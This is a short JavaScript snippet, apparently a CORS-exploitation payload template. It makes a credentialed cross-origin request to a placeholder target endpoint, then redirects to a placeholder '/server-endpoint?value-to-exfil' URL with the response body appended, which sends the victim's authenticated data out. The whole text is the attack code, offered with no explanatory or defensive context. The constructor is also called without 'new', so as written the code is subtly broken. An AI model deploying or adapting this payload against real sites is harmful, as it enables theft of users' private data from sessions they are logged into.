var req = XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'target-url/endpoint', true);
req.withCredentials = true;
req.send();

function reqListener(){
    location = '/server-endpoint?value-to-exfil'+this.responseText;
}